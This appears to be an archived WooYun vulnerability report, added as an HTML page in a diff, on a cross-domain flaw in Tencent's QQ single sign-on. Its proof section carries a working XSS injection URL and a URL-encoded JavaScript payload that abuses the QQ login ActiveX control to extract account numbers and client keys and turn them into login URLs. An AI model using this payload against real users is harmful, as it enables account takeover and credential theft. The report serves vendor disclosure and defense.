@@ -1,0 +1,188 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯单点登录系统跨域劫持漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯单点登录系统跨域劫持漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/rayh4c">rayh4c</a> 
+</li><li>提交时间：		2010-07-27 01:39</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2010-07-27：	细节已通知厂商并且等待厂商处理中<br/>
+									1970-01-01：	厂商已经确认，细节仅向厂商公开<br/>
+									1970-01-11：	细节向核心白帽子及相关领域专家公开<br/>
+									1970-01-21：	细节向普通白帽子公开<br/>
+									1970-01-31：	细节向实习白帽子公开<br/>
+									2010-08-26：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">腾讯单点登录系统在安全架构上存在安全缺陷，黑客可以轻易通过一些漏洞跨域劫持单点登录系统，从而获取客户端QQ所有相关服务的权限。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">QQ的快速登录插件的信任域是xui.ptlogin2.qq.com，其单点登录页面存在一个跨域设置document.domain=&#039;qq.com&#039;,通过其他*.qq.com下的WEB应用能够注入脚本到信任域xui.ptlogin2.qq.com，从而操作快速登录插件盗取用户的密钥。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">随便找QQ分站的一个XSS漏洞即可攻击。<br />
+<br />
+<br />
+<br />
+1.通过XSS漏洞注入远程的攻击脚本 http://127.0.0.1/xss.js<br />
+<br />
+<br />
+<br />
+http://product.tech.qq.com/simp_search.php?keyword=&quot;&gt;&lt;/script&gt;&lt;script/src=http://127.0.0.1/xss.js&gt;&lt;/script&gt;<br />
+<br />
+<br />
+<br />
+2.快速登录插件攻击测试脚本XSS.JS<br />
+<br />
+<br />
+<br />
+</p><pre><code>window.name = &#039;function%20clientkey%28%29%7B%0D%0A%20%20%20%20var%20q_hummerQtrl%20%3D%20new%20ActiveXObject%28%22SSOAxCtrlForPTLogin.SSOForPTLogin2%22%29%3B%0D%0A%20%20%20%20var%20A%20%3D%20q_hummerQtrl.CreateTXSSOData%28%29%3B%0D%0A%20%20%20%20q_hummerQtrl.InitSSOFPTCtrl%280%2C%20A%29%3B%0D%0A%20%20%20%20var%20g_vOptData%20%3D%20q_hummerQtrl.CreateTXSSOData%28%29%3B%0D%0A%20%20%20%20var%20q_aUinList%20%3D%20%5B%5D%3B%0D%0A%20%20%20%20function%20hummer_loaduin%28%29%7B%0D%0A%20%20%20%20%20%20%20%20q_aUinList.length%20%3D%200%3B%0D%0A%20%20%20%20%20%20%20%20var%20Q%20%3D%20q_hummerQtrl.DoOperation%281%2C%20g_vOptData%29%3B%0D%0A%20%20%20%20%20%20%20%20if%20%28null%20%3D%3D%20Q%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20try%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20N%20%3D%20Q.GetArray%28%22PTALIST%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20U%20%3D%20N.GetSize%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20P%20%3D%20%22%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20%28var%20V%20%3D%200%3B%20V%20%3C%20U%3B%20V++%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20C%20%3D%20N.GetData%28V%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20S%20%3D%20C.GetDWord%28%22dwSSO_Account_dwAccountUin%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20G%20%3D%20%22%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20T%20%3D%20%22%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20G%20%3D%20C.GetArray%28%22SSO_Account_AccountValueList%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20T%20%3D%20G.GetStr%280%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20catch%20%28R%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20T%20%3D%200%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20L%20%3D%200%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20L%20%3D%20C.GetWord%28%22wSSO_Account_wFaceIndex%22%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20catch%20%28R%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20L%20%3D%200%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20M%20%3D%20%22%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20M%20%3D%20C.GetStr%28%22strSSO_Account_strNickName%22%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20catch%20%28R%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20M%20%3D%20%22%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20J%20%3D%200%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20J%20%3D%20C.GetByte%28%22cSSO_Account_cGender%22%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20catch%20%28R%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20J%20%3D%200%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20K%20%3D%200%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20K%20%3D%20C.GetDWord%28%22dwSSO_Account_dwUinFlag%22%29%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20catch%20%28R%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20K%20%3D%200%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20D%20%3D%20C.GetBuf%28%22bufGTKey_PTLOGIN%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20E%20%3D%20C.GetBuf%28%22bufST_PTLOGIN%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20I%20%3D%20%22%22%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20A%20%3D%20E.GetSize%28%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20%28var%20O%20%3D%200%3B%20O%20%3C%20A%3B%20O++%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20B%20%3D%20E.GetAt%28O%29.toString%28%2216%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28B.length%20%3D%3D%201%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20B%20%3D%20%220%22%20+%20B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20I%20+%3D%20B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20H%20%3D%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20uin%3A%20S%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3A%20T%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20face%3A%20L%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nick%3A%20M%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20gender%3A%20J%2C%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20key%3A%20I%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20q_aUinList%5BV%5D%20%3D%20H%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%20%0D%0A%20%20%20%20%20%20%20%20catch%20%28R%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20hummer_loaduin%28%29%3B%0D%0A%20%20%20%20var%20str%20%3D%20%5B%5D%3B%0D%0A%20%20%20%20for%20%28var%20i%20%3D%200%3B%20i%20%3C%20q_aUinList.length%3B%20i++%29%20%7B%0D%0A%20%20%20%20%20%20%20%20str.push%28q_aUinList%5Bi%5D.uin%20+%20%22%2C%22%20+%20q_aUinList%5Bi%5D.key%29%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20str%20%3D%20str.join%28%22%7C%22%29%3B%0D%0A%20%20%20%20return%20str%3B%0D%0A%7D%0D%0A%0D%0A//alert%28clientkey%28%29%29%0D%0A%0D%0Avar%20q_ver%20%3D%20%5B%5D%3B%0D%0Ak_tmp%20%3D%20clientkey%28%29.split%28%22%7C%22%29%0D%0Afor%20%28var%20k%20%3D%200%3B%20k%20%3C%20k_tmp.length%3B%20k++%29%20%7B%0D%0A%20%20%20%20k2%20%3D%20k_tmp%5Bk%5D.split%28%22%2C%22%29%3B%0D%0A%20%20%20%20qq%20%3D%20k2%5B0%5D%3B%0D%0A%20%20%20%20ck%20%3D%20k2%5B1%5D%3B%0D%0A%20%20%20%20for%20%28var%20j%20%3D%200%3B%20j%20%3C%20k2.length%3B%20j++%29%20%7B%0D%0A%20%20%20%20%20%20%20%20q_ver.push%28k2%5Bj%5D%29%0D%0A%20%20%20%20%7D%0D%0A%7D%0D%0Aq_ver%20%3D%20q_ver.join%28%22%5Cr%5Cn%22%29%3B%0D%0A%0D%0AsetTimeout%28function%28%29%7B%0D%0A%20%20%20%20document.write%28%27QQ%20%26%20ClientKey%3A%3Cbr%3E%3Cbr%3E%27%20+%20%27%3CTEXTAREA%20NAME%3D%22output%22%20style%3D%22width%3A60%25%3B%20height%3A%20150px%3B%22%20class%3D%22textbox%22%3E%27%20+%20q_ver%20+%20%27%3C%5C/TEXTAREA%3E%3Cbr%3E%3Cbr%3EQQ%20Clientkey%20Url%3A%3Cbr%3E%3Cbr%3E%27%20+%20%27%3CTEXTAREA%20NAME%3D%22output%22%20style%3D%22width%3A60%25%3B%20height%3A%20150px%3B%22%20class%3D%22textbox%22%3E%27%20+%20%27http%3A//ptlogin2.qq.com/jump%3Fclientuin%3D%27%20+%20qq%20+%20%27%26clientkey%3D%27%20+%20ck%20+%20%27%26keyindex%3D9%26u1%3Dhttp%3A//pay.qq.com%3C%5C/TEXTAREA%3E%27%29%0D%0A%7D%2C%201000%29%3B&#039;<br />
+<br />
+window.onload =function(){<br />
+document.write(&quot;&lt;script&gt;alert(document.domain=\&#039;qq.com\&#039;)&lt;\/script&gt;&lt;a href=\&quot;javascript:x=window.open(\&#039;http://xui.ptlogin2.qq.com/cgi-bin/login?appid=1&amp;s_url=http://360.cn\&#039;);setTimeout(function(){x.eval(unescape(window.name))},2000);void(1)\&quot;&gt;cross domain fuck qq client key!!!&lt;\/a&gt;&quot;)<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">和开发人员沟通，彻底清查快速登录服务应用是否添加了不安全的跨域设置或其他危险的信任域。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/rayh4c" title="rayh4c">rayh4c</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-0118" title="腾讯单点登录系统跨域劫持漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2010-07-27 01:39</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">收到，我们尽快确认</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="118";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
